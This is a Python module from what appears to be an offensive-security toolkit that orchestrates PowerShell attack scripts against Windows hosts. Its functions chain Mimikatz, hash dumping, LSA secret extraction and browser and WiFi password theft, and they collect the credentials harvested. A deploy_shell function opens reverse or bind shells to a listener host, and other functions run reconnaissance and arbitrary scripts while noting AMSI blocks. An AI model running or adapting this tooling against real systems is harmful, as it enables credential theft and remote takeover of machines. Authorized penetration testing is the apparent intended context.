"""
PowerShell Arsenal Attack Orchestration

High-level attack orchestration using PowerShell scripts.
Provides organized attack workflows for credential gathering,
system reconnaissance, persistence, and lateral movement.

Usage:
    from aipt_v2.tools.ps_arsenal import PSArsenalAttacks, PSArsenalConfig

    config = PSArsenalConfig(scripts_path="/tmp/ps_arsenal")
    attacks = PSArsenalAttacks(config)
    result = await attacks.gather_all_credentials()
"""

import asyncio
import logging
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

from aipt_v2.tools.ps_arsenal.ps_config import PSArsenalConfig, get_ps_config
from aipt_v2.tools.ps_arsenal.ps_executor import create_executor_from_config
from aipt_v2.tools.ps_arsenal.ps_metadata import (
    ScriptCategory,
    get_scripts_by_category,
)
from aipt_v2.tools.ps_arsenal.ps_parsers import (
    PSArsenalParser,
    PSCredential,
    PSFinding,
    PSFindingCategory,
    PSFindingSeverity,
)
from aipt_v2.tools.winpwn.powershell_executor import PowerShellResult

logger = logging.getLogger(__name__)


@dataclass
class AttackResult:
    """Result of an attack operation."""

    success: bool
    attack_name: str
    scripts_executed: List[str]
    findings: List[PSFinding] = field(default_factory=list)
    credentials: List[PSCredential] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    raw_outputs: Dict[str, str] = field(default_factory=dict)
    execution_time: float = 0.0
    timestamp: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now(timezone.utc).isoformat()

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "success": self.success,
            "attack_name": self.attack_name,
            "scripts_executed": self.scripts_executed,
            "findings_count": len(self.findings),
            "credentials_count": len(self.credentials),
            "findings": [f.to_dict() for f in self.findings],
            "credentials": [c.to_dict() for c in self.credentials],
            "errors": self.errors,
            "execution_time": self.execution_time,
            "timestamp": self.timestamp,
        }

    @property
    def critical_findings(self) -> List[PSFinding]:
        """Get critical severity findings."""
        return [f for f in self.findings if f.severity == PSFindingSeverity.CRITICAL]

    @property
    def high_findings(self) -> List[PSFinding]:
        """Get high severity findings."""
        return [f for f in self.findings if f.severity == PSFindingSeverity.HIGH]


class PSArsenalAttacks:
    """
    PowerShell Arsenal attack orchestrator.

    Provides high-level attack workflows using PowerShell scripts.
    """

    def __init__(self, config: Optional[PSArsenalConfig] = None):
        """
        Initialize attack orchestrator.

        Args:
            config: PSArsenalConfig instance (created from env if not provided)
        """
        self.config = config or get_ps_config()
        self.executor = create_executor_from_config(self.config)
        self.parser = PSArsenalParser()
        self._results: List[AttackResult] = []

    async def gather_all_credentials(
        self, include_wlan: bool = True, include_browser: bool = True, timeout_per_script: int = 120
    ) -> AttackResult:
        """
        Comprehensive credential gathering attack.

        Runs multiple credential extraction scripts and aggregates results.

        Args:
            include_wlan: Include WiFi password extraction
            include_browser: Include browser credential extraction
            timeout_per_script: Timeout for each script

        Returns:
            AttackResult with all extracted credentials
        """
        start_time = asyncio.get_event_loop().time()
        scripts_to_run = []
        all_findings = []
        all_credentials = []
        errors = []
        raw_outputs = {}

        # Core credential scripts (require admin)
        admin_scripts = [
            "Invoke-Mimikatz",
            "Get-PassHashes",
            "Get-LSASecret",
        ]

        # User-level scripts
        user_scripts = [
            "Invoke-SessionGopher",
        ]

        if include_wlan:
            user_scripts.append("Get-WLAN-Keys")
        if include_browser:
            user_scripts.append("Get-WebCredentials")

        scripts_to_run = admin_scripts + user_scripts

        for script_name in scripts_to_run:
            try:
                result = await self.executor.execute_by_name(
                    script_name, timeout=timeout_per_script
                )

                raw_outputs[script_name] = result.output

                if result.success:
                    findings, creds = self.parser.parse_all(result.output, script_name)
                    all_findings.extend(findings)
                    all_credentials.extend(creds)
                else:
                    if result.metadata.get("privilege_error"):
                        errors.append(f"{script_name}: Requires admin privileges")
                    elif result.metadata.get("amsi_blocked"):
                        errors.append(f"{script_name}: Blocked by AMSI")
                    else:
                        errors.append(f"{script_name}: {result.stderr[:100]}")

            except Exception as e:
                logger.exception(f"Error executing {script_name}")
                errors.append(f"{script_name}: {str(e)}")

        execution_time = asyncio.get_event_loop().time() - start_time

        attack_result = AttackResult(
            success=len(all_credentials) > 0 or len(all_findings) > 0,
            attack_name="gather_all_credentials",
            scripts_executed=scripts_to_run,
            findings=all_findings,
            credentials=all_credentials,
            errors=errors,
            raw_outputs=raw_outputs,
            execution_time=execution_time,
        )

        self._results.append(attack_result)
        return attack_result

    async def system_reconnaissance(self, timeout_per_script: int = 60) -> AttackResult:
        """
        System reconnaissance attack.

        Gathers comprehensive system information.

        Args:
            timeout_per_script: Timeout for each script

        Returns:
            AttackResult with system information findings
        """
        start_time = asyncio.get_event_loop().time()
        scripts_to_run = ["Get-Information", "Check-VM"]
        all_findings = []
        errors = []
        raw_outputs = {}

        for script_name in scripts_to_run:
            try:
                result = await self.executor.execute_by_name(
                    script_name, timeout=timeout_per_script
                )

                raw_outputs[script_name] = result.output

                if result.success:
                    findings, _ = self.parser.parse_all(result.output, script_name)
                    all_findings.extend(findings)
                else:
                    errors.append(f"{script_name}: {result.stderr[:100]}")

            except Exception as e:
                errors.append(f"{script_name}: {str(e)}")

        execution_time = asyncio.get_event_loop().time() - start_time

        attack_result = AttackResult(
            success=len(all_findings) > 0,
            attack_name="system_reconnaissance",
            scripts_executed=scripts_to_run,
            findings=all_findings,
            errors=errors,
            raw_outputs=raw_outputs,
            execution_time=execution_time,
        )

        self._results.append(attack_result)
        return attack_result

    async def deploy_shell(
        self, shell_type: str, lhost: str, lport: int, reverse: bool = True
    ) -> AttackResult:
        """
        Deploy a reverse/bind shell.

        Args:
            shell_type: Shell type (tcp, udp, icmp, http, https, wmi)
            lhost: Listener IP address
            lport: Listener port
            reverse: Use reverse shell (vs bind)

        Returns:
            AttackResult with shell deployment status
        """
        start_time = asyncio.get_event_loop().time()
        script_name = f"Invoke-PowerShell{shell_type.capitalize()}"

        try:
            result = await self.executor.execute_shell(
                shell_type=shell_type, lhost=lhost, lport=lport, reverse=reverse, timeout=60
            )

            findings = []
            errors = []

            if result.success or "connected" in result.output.lower():
                findings.append(
                    PSFinding(
                        title=f"Shell Deployed: {shell_type.upper()}",
                        category=PSFindingCategory.SHELL,
                        severity=PSFindingSeverity.HIGH,
                        description=f"{'Reverse' if reverse else 'Bind'} shell deployed to {lhost}:{lport}",
                        source_script=script_name,
                        mitre_attack=["T1059.001"],
                    )
                )
            else:
                errors.append(f"Shell deployment failed: {result.stderr}")

        except Exception as e:
            findings = []
            errors = [str(e)]
            result = PowerShellResult(
                success=False, exit_code=-1, stdout="", stderr=str(e), execution_time=0
            )

        execution_time = asyncio.get_event_loop().time() - start_time

        attack_result = AttackResult(
            success=len(findings) > 0,
            attack_name="deploy_shell",
            scripts_executed=[script_name],
            findings=findings,
            errors=errors,
            raw_outputs={script_name: result.output if result else ""},
            execution_time=execution_time,
        )

        self._results.append(attack_result)
        return attack_result

    async def run_category(
        self, category: ScriptCategory, timeout_per_script: int = 120
    ) -> AttackResult:
        """
        Run all scripts in a category.

        Args:
            category: Script category to run
            timeout_per_script: Timeout for each script

        Returns:
            AttackResult with aggregated findings
        """
        start_time = asyncio.get_event_loop().time()
        scripts = get_scripts_by_category(category)
        all_findings = []
        all_credentials = []
        errors = []
        raw_outputs = {}
        scripts_executed = []

        for script_meta in scripts:
            # Skip interactive scripts
            if script_meta.requires_interaction:
                continue

            script_name = script_meta.name
            scripts_executed.append(script_name)

            try:
                result = await self.executor.execute_by_name(
                    script_name, timeout=timeout_per_script
                )

                raw_outputs[script_name] = result.output

                if result.success:
                    findings, creds = self.parser.parse_all(result.output, script_name)
                    all_findings.extend(findings)
                    all_credentials.extend(creds)
                else:
                    errors.append(f"{script_name}: {result.stderr[:100]}")

            except Exception as e:
                errors.append(f"{script_name}: {str(e)}")

        execution_time = asyncio.get_event_loop().time() - start_time

        attack_result = AttackResult(
            success=len(all_findings) > 0,
            attack_name=f"run_category_{category.value}",
            scripts_executed=scripts_executed,
            findings=all_findings,
            credentials=all_credentials,
            errors=errors,
            raw_outputs=raw_outputs,
            execution_time=execution_time,
        )

        self._results.append(attack_result)
        return attack_result

    async def execute_custom(
        self, script_name: str, parameters: Optional[Dict[str, Any]] = None, timeout: int = 300
    ) -> AttackResult:
        """
        Execute a specific script with custom parameters.

        Args:
            script_name: Script to execute
            parameters: Script parameters
            timeout: Execution timeout

        Returns:
            AttackResult for the script
        """
        start_time = asyncio.get_event_loop().time()
        findings = []
        credentials = []
        errors = []

        try:
            result = await self.executor.execute_by_name(
                script_name, parameters=parameters, timeout=timeout
            )

            if result.success:
                findings, credentials = self.parser.parse_all(result.output, script_name)
            else:
                errors.append(result.stderr[:200])

            raw_output = result.output

        except Exception as e:
            errors.append(str(e))
            raw_output = ""

        execution_time = asyncio.get_event_loop().time() - start_time

        attack_result = AttackResult(
            success=len(errors) == 0,
            attack_name=f"custom_{script_name}",
            scripts_executed=[script_name],
            findings=findings,
            credentials=credentials,
            errors=errors,
            raw_outputs={script_name: raw_output},
            execution_time=execution_time,
        )

        self._results.append(attack_result)
        return attack_result

    def get_results(self) -> List[AttackResult]:
        """Get all attack results."""
        return self._results.copy()

    def get_all_credentials(self) -> List[PSCredential]:
        """Get all extracted credentials across all attacks."""
        all_creds = []
        for result in self._results:
            all_creds.extend(result.credentials)
        return all_creds

    def get_all_findings(self) -> List[PSFinding]:
        """Get all findings across all attacks."""
        all_findings = []
        for result in self._results:
            all_findings.extend(result.findings)
        return all_findings

    async def cleanup(self) -> None:
        """Cleanup resources."""
        await self.executor.cleanup()


__all__ = [
    "PSArsenalAttacks",
    "AttackResult",
]
